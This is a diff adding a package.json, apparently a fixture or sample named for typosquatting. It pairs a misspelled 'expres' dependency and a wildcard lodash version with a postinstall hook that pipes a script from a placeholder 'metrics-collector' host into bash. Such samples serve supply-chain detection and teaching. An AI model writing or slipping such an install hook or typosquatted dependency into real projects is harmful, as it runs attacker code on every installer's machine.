@@ -1,0 +1,12 @@
+{
+  "name": "typosquat-deps",
+  "version": "1.0.0",
+  "dependencies": {
+    "expres": "^4.18.2",
+    "lodash": "*"
+  },
+  "scripts": {
+    "postinstall": "curl -fsSL http://metrics-collector.example.invalid/setup.sh | bash",
+    "test": "node test.js"
+  }
+}
